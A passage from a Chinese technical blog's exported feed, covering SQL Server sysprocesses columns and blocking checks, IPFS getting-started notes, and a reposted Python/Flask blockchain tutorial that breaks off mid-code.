<p>  列名            数据类型     描述<br>  spid            smallint     SQL Server 进程 ID。<br>  kpid            smallint     Microsoft Windows NT 4.0? 线程 ID。<br>  blocked         smallint     分块进程的进程 ID (spid)。<br>  waittype        binary(2)    保留。<br>  waittime        int          当前等待时间（以毫秒为单位）。当进程不处于等待时，为 0。<br>  lastwaittype    nchar(32)    表示上次或当前等待类型名称的字符串。<br>  waitresource    nchar(32)    锁资源的文本化表示法。<br>  dbid            smallint     当前正由进程使用的数据库 ID。<br>  uid             smallint     执行命令的用户 ID。<br>  cpu             int          进程的累计 CPU 时间。无论 SET STATISTICS TIME ON 选项是 ON 还是 OFF，都为所有进程更新该条目。<br>  physical_io    int          进程的累计磁盘读取和写入。<br>  memusage        int          当前分配给该进程的过程高速缓存中的页数。一个负数，表示进程正在释放由另一个进程分配的内存。<br>  login_time     datetime     客户端进程登录到服务器的时间。对于系统进程，是存储 SQL Server 启动发生的时间。<br>  last_batch     datetime     客户端进程上次执行远程存储过程调用或 EXECUTE 语句的时间。对于系统进程，是存储 SQL Server 启动发生的时间。<br>  ecid            smallint     用于唯一标识代表单个进程进行操作的子线程的执行上下文 ID。<br>  open_tran      smallint     进程的打开事务数。<br>  status          nchar(30)    进程 ID 状态（如运行、休眠等）。<br>  sid             binary(85)   用户的全局唯一标识符 (GUID)。<br>  hostname        nchar(128)   工作站的名称。<br>  program_name   nchar(128)   应用程序的名称。<br>  hostprocess     nchar(8)     工作站进程 ID 号。<br>  cmd             nchar(16)    当前正在执行的命令。<br>  nt_domain      nchar(128)   客户端的 Windows NT 4 域（如果使用 Windows 身份验证）或信任连接的 Windows NT 4 域。<br>  nt_username    nchar(128)   进程的 Windows NT 4.0用户名（如果使用 Windows 身份验证）或信任连接的 Windows NT 4 用户名。<br>  net_address    nchar(12)    指派给每个用户工作站上的网络接口卡唯一标识符。当用户登录时，该标识符插入 net_address 列。<br>  net_library    nchar(12)    用于存储客户端网络库的列。每个客户端进程都在网络连接上进入。网络连接有一个与这些进程关联的网络库，该网络库使得这些进程可以建立连接。有关更多信息，请参见客户端和服务器 Net-Library。<br>  loginame        nchar(128)   登录名。</p>
<hr>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>检查 Sql Server的阻塞和死锁</title>
    <url>/blog/database/sqlserver/zshss/</url>
    <content><![CDATA[<p>Master.dbo.<a href="/database/sqlserver/sysprocesses.php" title="关于SYSPROCESSES表各字段的作用">SYSPROCESSES</a>中含有进程相关信息，可以从这里面看出阻塞和死锁。</p>
<p>先查找哪个链接的 blocked 字段不为0。如 SPID53的blocked 字段不为0，而是<br>52。SPID 52 的 blocked 为0，就可以得出结论：此时有阻塞发生，53 被 52<br>阻塞住了。如果你发现一个连接的 blocked<br>字段的值等于它自己，那说明这个连接正在做磁盘读写，它要等自己的 I&#x2F;O<br>做完。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>IPFS 入门笔记</title>
    <url>/blog/arch/blockchain/ipfsinstall/</url>
    <content><![CDATA[<p>##IPFS 是什么</p>
<p>IPFS（InterPlanetary File System，星际文件系统）是永久的、去中心化保存和共享文件的方法，这是一种内容可寻址、版本化、点对点超媒体的分布式协议。</p>
<ul>
<li>内容可寻址：通过文件内容生成唯一哈希值来标识文件，而不是通过文件保存位置来标识。相同内容的文件在系统中只会存在一份，节约存储空间</li>
<li>版本化：可追溯文件修改历史</li>
<li>点对点超媒体：P2P 保存各种各样类型的数据</li>
<li>可以把 IPFS 想象成所有文件数据是在同一个 BitTorrent 群并且通过同一个 Git 仓库存取。</li>
</ul>
<p>总之，它集一些成功系统（分布式哈希表、BitTorrent、Git、自认证文件系统）的优势于一身，是一套很厉害的文件存取系统。</p>
<p>##IPFS 使用场景</p>
<p>IPFS 的发明者 Juan Benet（<a href="mailto:&#x6a;&#x75;&#97;&#x6e;&#x40;&#98;&#101;&#x6e;&#101;&#x74;&#x2e;&#x61;&#105;">&#x6a;&#x75;&#97;&#x6e;&#x40;&#98;&#101;&#x6e;&#101;&#x74;&#x2e;&#x61;&#105;</a>）在 IPFS 技术白皮书中假设了一些使用场景：</p>
<ul>
<li>在 &#x2F;ipfs 和 &#x2F;ipns 下挂载全球文件系统</li>
<li>挂载的个人同步文件夹，拥有版本功能</li>
<li>文件加密，数据共享系统</li>
<li>可用于所有软件的带版本的包管理器（已经实现了：<a href="https://github.com/whyrusleeping/gx%EF%BC%89">https://github.com/whyrusleeping/gx）</a></li>
<li>可以作为虚机的根文件系统</li>
<li>可以作为数据库：应用可以直接操作 Merkle DAG，拥有 IPFS 提供的版本化、缓存以及分布式特性</li>
<li>可以做（加密）通讯平台</li>
<li>各种类型的 CDN</li>
<li>永久的 Web，不存在不能访问的链接</li>
</ul>
<p>##安装与初始化</p>
<p>下载 go-ipfs 解压（下面的示例我是在 Windows 10 上做的，解压目录为 D:\go-ipfs），然后到解压目录执行命令 ipfs init，将在用户 home（~）下建立 .ipfs 目录存放数据，默认最大存储 10G。init 命令可以带参，比如修改最大存储、目录等，具体参考 ipfs init help。</p>
<p>继续执行命令 ipfs daemon 启动节点服务器：</p>
<ul>
<li>加入 IPFS 网络</li>
<li>本地 HTTP 服务器，默认 8080 端口</li>
<li>处理后续 ipfs 的客户端命令</li>
</ul>
<p>新开一个命令行，执行命令 ipfs id 以查看当前节点标识:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;ID&quot;: &quot;QmSYF1HZxhPUWWGrz5bMn16tdD73AeMVhp7pNSHkVCMF7R&quot;,</span><br><span class="line">    &quot;PublicKey&quot;: &quot;....&quot;,</span><br><span class="line">    &quot;Addresses&quot;: [</span><br><span class="line">      &quot;/ip4/169.254.40.215/tcp/4001/ipfs/...&quot;,</span><br><span class="line">      ....</span><br><span class="line">    ],</span><br><span class="line">    &quot;AgentVersion&quot;: &quot;go-ipfs/0.4.12/&quot;,</span><br><span class="line">    &quot;ProtocolVersion&quot;: &quot;ipfs/0.1.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>浏览器访问 <a href="http://localhost:5001/webui">http://localhost:5001/webui</a> 进入管理界面，查看系统状态、管理文件以及配置系统。</p>
<p>##配置</p>
<p>除了使用 Web 管理界面修改配置外，也可以直接用命令行 ipfs config show &gt; ipfs.conf 先导出当前配置（JSON 格式，配置项不多且含义明显），改完后使用 ipfs config replace ipfs.conf 更新配置，重启服务器就生效了。当然，修改配置也可以直接用 ipfs config edit。</p>
<p>服务器最终使用的配置文件保存在 ~&#x2F;.ipfs&#x2F;config 中，对比刚刚导出的文件我们发现导出的文件只比这个 config 少了一项 Identity.PrivKey，即节点初始化时自动生成的 RSA 私钥。</p>
<p>##密钥对</p>
<p>节点初始化时会自动生成 RSA 密钥对，并且私钥没有设置密码。</p>
<p>公钥通过多重哈希得到节点 id（即上面的 QmSYF1HZxhPUWWGrz5bMn16tdD73AeMVhp7pNSHkVCMF7R），节点服务器启动后会和其他节点交互公钥，后续通讯时使用对方公钥加密数据，通过多重哈希对方公钥、对比对方节点 id 来确认是否正在和正确的节点交互。</p>
<p>私钥用来解密接收到的数据，也用于 ipns 来绑定文件名。整个过程没有引入证书，仅是使用了 PKI 机制。</p>
<p>总之，我觉得可以暂时不用关心密钥对，可能只有在一些使用场景下面才需要吧。</p>
<p>##添加文件</p>
<p>我当前目录结构是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\GO-IPFS</span><br><span class="line">│  build-log</span><br><span class="line">│  config</span><br><span class="line">│  install.sh</span><br><span class="line">│  ipfs.conf</span><br><span class="line">│  ipfs.exe</span><br><span class="line">│  LICENSE</span><br><span class="line">│  README.md</span><br><span class="line">│</span><br><span class="line">└─b3log</span><br><span class="line">    └─hacpai</span><br><span class="line">            README.md</span><br></pre></td></tr></table></figure>
<p>我准备添加的目录是 b3log，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\go-ipfs&gt;ipfs add -r b3log</span><br><span class="line"> 94 B / 94 B [=============================================================================================] 100.00% 0s</span><br><span class="line">added Qmco94dYP733XwrUqFUhDtDG8RsqmGQ6UDPvnmH4Pvy2rv b3log/hacpai/README.md</span><br><span class="line">added Qmbkno2HVZdW7XfwsVjmuu9VDKBByczFR8qwsBXMjMrjPQ b3log/hacpai</span><br><span class="line">added QmPxebZuW2pgfzj5JWq22KUzxStmqQ6i7YUK9Sq9xepXT9 b3log</span><br></pre></td></tr></table></figure>

<p>这样我们使用 ipfs cat &#x2F;ipfs&#x2F;Qmco94dYP733XwrUqFUhDtDG8RsqmGQ6UDPvnmH4Pvy2rv 就可以查看 README.md 了。在其他节点上也可以，只要记住这个文件的哈希值就行了。我们可以在自己的 HTTP 网关上试试（注意我的端口改成了 5002，你的默认应该是 8080）.</p>
<p>当然也可以用 ipfs 官方的 HTTP 网关：</p>
<p><a href="https://ipfs.io/ipfs/Qmco94dYP733XwrUqFUhDtDG8RsqmGQ6UDPvnmH4Pvy2rv">https://ipfs.io/ipfs/Qmco94dYP733XwrUqFUhDtDG8RsqmGQ6UDPvnmH4Pvy2rv</a></p>
<p>##获取文件</p>
<p><code>ipfs get /ipns/QmSYF1HZxhPUWWGrz5bMn16tdD73AeMVhp7pNSHkVCMF7R</code></p>
<p>将获取刚才我们发布的 b3log 目录。</p>
<p>##Pin</p>
<p>IPFS 的本意是让用户觉得所有文件都是在本地的，没有“从远程服务器上下载文件”。Pin 是将文件长期保留在本地，不被垃圾回收。</p>
<p>执行 ipfs pin ls 可以查看哪些文件在本地是持久化的，通过 add 添加的文件默认就是 pin 过的。</p>
<p>##绑定节点名</p>
<p>每次修改文件后 add 都会返回不同的哈希，这对于网站来说就没法固定访问地址了，所以我们需要通过 ipns 来“绑定”节点名。</p>
<p>上面 b3log 目录的哈希值是 QmPxebZuW2pgfzj5JWq22KUzxStmqQ6i7YUK9Sq9xepXT9，我们将整个目录作为节点根目录发布：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\go-ipfs&gt;ipfs name publish QmPxebZuW2pgfzj5JWq22KUzxStmqQ6i7YUK9Sq9xepXT9</span><br><span class="line">Published to QmSYF1HZxhPUWWGrz5bMn16tdD73AeMVhp7pNSHkVCMF7R: /ipfs/QmPxebZuW2pgfzj5JWq22KUzxStmqQ6i7YUK9Sq9xepXT9</span><br></pre></td></tr></table></figure>

<p>然后我们就可以通过 ipns 访问了，注意是 ipns：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\go-ipfs&gt;ipfs cat /ipns/QmSYF1HZxhPUWWGrz5bMn16tdD73AeMVhp7pNSHkVCMF7R/hacpai/README.md</span><br><span class="line">The piper will lead us to reason.</span><br><span class="line"></span><br><span class="line">欢迎访问黑客与画家的社区 https://hacpai.com</span><br></pre></td></tr></table></figure>

<p>以后每次更新文件都再 publish 一下就行了。目前（v0.4.12）使用 ipns 访问会很慢，据说 v0.4.14 会解决。</p>
<p>##DNS 解析</p>
<p>IPFS 允许用户使用现有的域名系统，这样就能用一个好记的地址来访问文件了，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\go-ipfs&gt;ipfs cat /ipns/ipfs.b3log.org/hacpai/README.md</span><br><span class="line">The piper will lead us to reason.</span><br><span class="line"></span><br><span class="line">欢迎访问黑客与画家的社区 https://hacpai.com</span><br></pre></td></tr></table></figure>
<p>只需要在 DNS 解析加入一条 TXT 记录：</p>
<table>
<thead>
<tr>
<th>记录类型</th>
<th>主机记录</th>
<th>记录值</th>
</tr>
</thead>
<tbody><tr>
<td>TXT</td>
<td>ipfs</td>
<td>dnslink&#x3D;&#x2F;ipns&#x2F;QmSYF1HZxhPUWWGrz5bMn16tdD73AeMVhp7pNSHkVCMF7R</td>
</tr>
</tbody></table>
<p>##总结</p>
<ul>
<li>IPFS 是永久的、去中心化保存和共享文件的方法，这是一种内容可寻址、版本化、点对点超媒体的分布式协议</li>
<li>我们可以用它来存取文件，数据永不丢失</li>
<li>应用可以用它来做数据库，自动拥有版本化、缓存及分布式特性</li>
<li>官方参考实现使用 golang 编写，JavaScript、Python、C 等语言在陆续开发中</li>
<li>总之，IPFS 是一套非常厉害的文件系统</li>
</ul>
<p>转自：<a href="https://blog.csdn.net/dl88250/article/details/78579080#t1">https://blog.csdn.net/dl88250/article/details/78579080#t1</a></p>
]]></content>
      <categories>
        <category>架构</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>IPFS</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链python示例</title>
    <url>/blog/arch/blockchain/pythondemo/</url>
    <content><![CDATA[<p>在开始之前，我们需要做些准备工作，搞清楚一些问题。</p>
<p>什么是区块链？区块链是由不可变的、有顺序记录的区块组成。他们可以包含交易数据、文件数据或者其他你想要记录的数据。不过最重要的是这些区块通过哈希表链接在一起。</p>
<p>什么是散列？散列函数是一个输入值函数，从该输入创建一个确定输入值的输出值。</p>
<p>这篇文章适合谁，首先Python程序员，你只要能轻松地读写一些基本的Python代码就可以了；第二是HTTP程序员，因为我们接下来讲到的区块链，是构建在HTTP上面的，这需要你起码要了解HTTP请求的工作原理。</p>
<p>我需要做什么？首先要确保安装了Python 3.6以上的环境和Flask，此外还需要安装一个碉堡的Requests库。版本信息如下：</p>
<p><code>pip install Flask==0.12.2 requests==2.18.4</code></p>
<h2 id="第一步：创建区块链"><a href="#第一步：创建区块链" class="headerlink" title="第一步：创建区块链"></a>第一步：创建区块链</h2><p>打开你常用的编辑器，我个人比较喜欢PyCharm。创建一个新的文件，命名为 blockchain.py。整个项目，我们都只会用到这一个文件。有不清楚的地方，可以参考源代码。</p>
<p>表示一个区块链</p>
<p>我们将创建一个 Blockchain 类，它的构造函数里创建了一个初始为空的列表（用于存储我们的区块链），和一个存储交易的列表。下边是这个类的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Blockchain(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.chain = []</span><br><span class="line">        self.current_transactions = []</span><br><span class="line"></span><br><span class="line">    def new_block(self):</span><br><span class="line">        # Creates a new Block and adds it to the chain</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def new_transaction(self):</span><br><span class="line">        # Adds a new transaction to the list of transactions</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def hash(block):</span><br><span class="line">        # Hashes a Block</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def last_block(self):</span><br><span class="line">        # Returns the last Block in the chain</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<p>Blockchain参数的作用是管理区块链，也用于存储交易信息和添加区块的方式。</p>
<h3 id="区块到底长什么样？"><a href="#区块到底长什么样？" class="headerlink" title="区块到底长什么样？"></a>区块到底长什么样？</h3><p>每一个区块包含一个索引、一个时间戳、一个交易列表、一个证明（之后更多）和前一个区块的哈希值。</p>
<p>以下是一个区块的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">block = &#123;</span><br><span class="line">    &#x27;index&#x27;: 1,</span><br><span class="line">    &#x27;timestamp&#x27;: 1506057125.900785,</span><br><span class="line">    &#x27;transactions&#x27;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;sender&#x27;: &quot;8527147fe1f5426f9dd545de4b27ee00&quot;,</span><br><span class="line">            &#x27;recipient&#x27;: &quot;a77f5cdfa2934df3954a5c7c7da5df1f&quot;,</span><br><span class="line">            &#x27;amount&#x27;: 5,</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &#x27;proof&#x27;: 324984774000,</span><br><span class="line">    &#x27;previous_hash&#x27;: &quot;2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里，区块链的原理就很容易理解了：每一个区块包含它自己本身的一些变量，以及前一个区块的哈希值。这一点非常重要，因为哈希值保证了区块链不可篡改的特性。如果一个区块受到攻击哈希值变了，那么后面的所有区块的哈希值都会为之改变。</p>
<p>你可能想，我还是不太理解。没关系，先接着往下看。</p>
<h3 id="在区块上添加交易"><a href="#在区块上添加交易" class="headerlink" title="在区块上添加交易"></a>在区块上添加交易</h3><p>那么，我们怎么在区块上添加交易呢？可以使用new_transaction()参数。使用方法简单、直接，如下面代码所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Blockchain(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def new_transaction(self, sender, recipient, amount):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Creates a new transaction to go into the next mined Block</span><br><span class="line"></span><br><span class="line">        :param sender: &lt;str&gt; Address of the Sender</span><br><span class="line">        :param recipient: &lt;str&gt; Address of the Recipient</span><br><span class="line">        :param amount: &lt;int&gt; Amount</span><br><span class="line">        :return: &lt;int&gt; The index of the Block that will hold this transaction</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        self.current_transactions.append(&#123;</span><br><span class="line">            &#x27;sender&#x27;: sender,</span><br><span class="line">            &#x27;recipient&#x27;: recipient,</span><br><span class="line">            &#x27;amount&#x27;: amount,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        return self.last_block[&#x27;index&#x27;] + 1</span><br></pre></td></tr></table></figure>

<p>在 new_transaction() 添加交易信息到列表中后，它会返回下一个将被开采区块的索引号，交易信息将被打包到这个区块上。这对稍后提交交易的用户有用。</p>
<h3 id="创建新区块"><a href="#创建新区块" class="headerlink" title="创建新区块"></a>创建新区块</h3><p>在区块链创建完成后，我们需要创建一个创世区块（也就是区块链上的第一个区块）。当然，创世区块也需要被证明，这需要通过PoW的挖矿机制。后边我们会更多的介绍挖矿，这儿就不做过多的介绍了。</p>
<p>除了在构造函数中创建创始区块，我们还需要用new_block()、new_transaction() 和 hash()参数对其进行完善。代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">from time import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Blockchain(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.current_transactions = []</span><br><span class="line">        self.chain = []</span><br><span class="line"></span><br><span class="line">        # Create the genesis block</span><br><span class="line">        self.new_block(previous_hash=1, proof=100)</span><br><span class="line"></span><br><span class="line">    def new_block(self, proof, previous_hash=None):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Create a new Block in the Blockchain</span><br><span class="line">        :param proof: &lt;int&gt; The proof given by the Proof of Work algorithm</span><br><span class="line">        :param previous_hash: (Optional) &lt;str&gt; Hash of previous Block</span><br><span class="line">        :return: &lt;dict&gt; New Block</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        block = &#123;</span><br><span class="line">            &#x27;index&#x27;: len(self.chain) + 1,</span><br><span class="line">            &#x27;timestamp&#x27;: time(),</span><br><span class="line">            &#x27;transactions&#x27;: self.current_transactions,</span><br><span class="line">            &#x27;proof&#x27;: proof,</span><br><span class="line">            &#x27;previous_hash&#x27;: previous_hash or self.hash(self.chain[-1]),</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Reset the current list of transactions</span><br><span class="line">        self.current_transactions = []</span><br><span class="line"></span><br><span class="line">        self.chain.append(block)</span><br><span class="line">        return block</span><br><span class="line"></span><br><span class="line">    def new_transaction(self, sender, recipient, amount):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Creates a new transaction to go into the next mined Block</span><br><span class="line">        :param sender: &lt;str&gt; Address of the Sender</span><br><span class="line">        :param recipient: &lt;str&gt; Address of the Recipient</span><br><span class="line">        :param amount: &lt;int&gt; Amount</span><br><span class="line">        :return: &lt;int&gt; The index of the Block that will hold this transaction</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.current_transactions.append(&#123;</span><br><span class="line">            &#x27;sender&#x27;: sender,</span><br><span class="line">            &#x27;recipient&#x27;: recipient,</span><br><span class="line">            &#x27;amount&#x27;: amount,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        return self.last_block[&#x27;index&#x27;] + 1</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def last_block(self):</span><br><span class="line">        return self.chain[-1]</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def hash(block):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Creates a SHA-256 hash of a Block</span><br><span class="line">        :param block: &lt;dict&gt; Block</span><br><span class="line">        :return: &lt;str&gt;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        # We must make sure that the Dictionary is Ordered, or we&#x27;ll have inconsistent hashes</span><br><span class="line">        block_string = json.dumps(block, sort_keys=True).encode()</span><br><span class="line">        return hashlib.sha256(block_string).hexdigest()</span><br></pre></td></tr></table></figure>

<p>为了方便大家理解，我在上面代码中加了一些注释。到这里，我们就已经对区块链属性有一个全面的了解了。不过我们还是要知道，区块链是怎么创建、怎么开发，以及跟矿工有什么关系。</p>
<h3 id="关于工作量证明-PoW）"><a href="#关于工作量证明-PoW）" class="headerlink" title="关于工作量证明(PoW）"></a>关于工作量证明(PoW）</h3><p>工作证明算法（PoW）的作用，是对区块链上创建或开发新的区块的证明。其背后的核心是：找到一串解决某个数学问题的数字，这个数字必须符合两个条件：第一，难找；第二，很容易被验证（而且是很容易被任何人验证）。</p>
<p>我们来举个非常简单的例子来帮助大家理解。</p>
<p>我们来看一下这个例子，某个整数 x 乘以另外一个数 y ，得到的结果的哈希值必须是以 0 结尾。可以简单表示为：hash(x * y) &#x3D; ac23dc…0。所以，我们的目标是找到满足这个条件的一个 y 值。为了方便理解，我们暂定x&#x3D;5。下面我们就用Python来做这样一个运算：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line">x = 5</span><br><span class="line">y = 0  # We don&#x27;t know what y should be yet...</span><br><span class="line">while sha256(f&#x27;&#123;x*y&#125;&#x27;.encode()).hexdigest()[-1] != &quot;0&quot;:</span><br><span class="line">    y += 1</span><br><span class="line">print(f&#x27;The solution is y = &#123;y&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>最终，计算结果是 y&#x3D;21。因此，生成的以 0 结尾的哈希值是：</p>
<p><code>hash(5 * 21) = 1253e9373e...5e3600155e860</code></p>
<p>在比特币中，PoW算法被称为Hashcash，原理跟上面例子差不多。矿工们为了能创建一个新区块，铆足劲儿做着上面的数学题（只有胜出者才能添加区块）。一般而言，证明的难度取决于字符串中搜索的字符数量，先找到正确数字的旷工就能够在每笔交易中获得比特币作为奖励。</p>
<p>系统能够很容易验证他们的解决方案。</p>
<h3 id="实现基本的工作量证明"><a href="#实现基本的工作量证明" class="headerlink" title="实现基本的工作量证明"></a>实现基本的工作量证明</h3><p>下面在我们刚刚创建好的区块链上，来实现一个相似的工作量证明算法。规则与上边那个简单的例子相似：</p>
<p>找到一个数字 p ，它和前边一个区块的解决数字进行散列，生成前4位为 0 的哈希值。</p>
<p>下面是具体的Python代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">from time import time</span><br><span class="line">from uuid import uuid4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Blockchain(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def proof_of_work(self, last_proof):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Simple Proof of Work Algorithm:</span><br><span class="line">         - Find a number p&#x27; such that hash(pp&#x27;) contains leading 4 zeroes, where p is the previous p&#x27;</span><br><span class="line">         - p is the previous proof, and p&#x27; is the new proof</span><br><span class="line">        :param last_proof: &lt;int&gt;</span><br><span class="line">        :return: &lt;int&gt;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        proof = 0</span><br><span class="line">        while self.valid_proof(last_proof, proof) is False:</span><br><span class="line">            proof += 1</span><br><span class="line"></span><br><span class="line">        return proof</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def valid_proof(last_proof, proof):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Validates the Proof: Does hash(last_proof, proof) contain 4 leading zeroes?</span><br><span class="line">        :param last_proof: &lt;int&gt; Previous Proof</span><br><span class="line">        :param proof: &lt;int&gt; Current Proof</span><br><span class="line">        :return: &lt;bool&gt; True if correct, False if not.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        guess = f&#x27;&#123;last_proof&#125;&#123;proof&#125;&#x27;.encode()</span><br><span class="line">        guess_hash = hashlib.sha256(guess).hexdigest()</span><br><span class="line">        return guess_hash[:4] == &quot;0000&quot;</span><br></pre></td></tr></table></figure>

<p>我们可以通过修改哈希值前 0 的数量，来调整算法的难度，一般来说，4位已经是足够了。每在哈希值前多加一个0，计算所花费的时间将呈指数倍增加。</p>
<p>到这儿，我们的类基本写好了。下面，我们准备通过 HTTP 请求与其交互。</p>
<h2 id="第二步：创建-API"><a href="#第二步：创建-API" class="headerlink" title="第二步：创建 API"></a>第二步：创建 API</h2><p>我们打算使用 Python 的 Flask 框架，它是一个轻型框架，可以很容易实现端点到Python函数的映射。这样，我们就可以使用 HTTP 请求通过网页访问我们的区块链了。</p>
<p>我们用以下三个方法创建：</p>
<p>&#x2F;transactions&#x2F;new 为一个区块创建一个新的交易；<br>&#x2F;mine 告诉我们的服务器开采一个新的区块；<br>&#x2F;chain 返回完整的 Blockchain 类。</p>
<h3 id="搭建-Flask-框架"><a href="#搭建-Flask-框架" class="headerlink" title="搭建 Flask 框架"></a>搭建 Flask 框架</h3><p>我们的服务器会在区块链网络中形成单个节点。下面来创建一些样板代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">from textwrap import dedent</span><br><span class="line">from time import time</span><br><span class="line">from uuid import uuid4</span><br><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Blockchain(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Instantiate our Node</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># Generate a globally unique address for this node</span><br><span class="line">node_identifier = str(uuid4()).replace(&#x27;-&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># Instantiate the Blockchain</span><br><span class="line">blockchain = Blockchain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/mine&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def mine():</span><br><span class="line">    return &quot;We&#x27;ll mine a new Block&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/transactions/new&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def new_transaction():</span><br><span class="line">    return &quot;We&#x27;ll add a new transaction&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/chain&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def full_chain():</span><br><span class="line">    response = &#123;</span><br><span class="line">        &#x27;chain&#x27;: blockchain.chain,</span><br><span class="line">        &#x27;length&#x27;: len(blockchain.chain),</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(response), 200</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>

<p>我们来简单的解释一下上边的代码：</p>
<p>第15行： 实例化我们的节点；加载 Flask 框架。<br>第18行：为我们的节点创建一个随机名称。<br>第21行：实例化 Blockchain 类。<br>第24-26行：创建 &#x2F;mine 端点，这是一个GET请求。<br>第28-30行：创建 &#x2F;transactions&#x2F;new 端点，这是一个 POST 请求，我们将用它来发送数据。<br>第32-38行：创建 &#x2F;chain 端点，它是用来返回整个 Blockchain 类。<br>第40-41行：设置服务器运行端口为 5000。</p>
<h3 id="交易节点"><a href="#交易节点" class="headerlink" title="交易节点"></a>交易节点</h3><p>交易的请求是什么形式呢？下面我们看看用户发送到服务器的一段请求代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;sender&quot;: &quot;my address&quot;,</span><br><span class="line"> &quot;recipient&quot;: &quot;someone else&#x27;s address&quot;,</span><br><span class="line"> &quot;amount&quot;: 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们已经写好了将交易打包到区块上的代码，剩下的部分就简单了。只需要调用这个方法，从而实现添加交易的功能。下面是具体代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">from textwrap import dedent</span><br><span class="line">from time import time</span><br><span class="line">from uuid import uuid4</span><br><span class="line"></span><br><span class="line">from flask import Flask, jsonify, request</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/transactions/new&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def new_transaction():</span><br><span class="line">    values = request.get_json()</span><br><span class="line"></span><br><span class="line">    # Check that the required fields are in the POST&#x27;ed data</span><br><span class="line">    required = [&#x27;sender&#x27;, &#x27;recipient&#x27;, 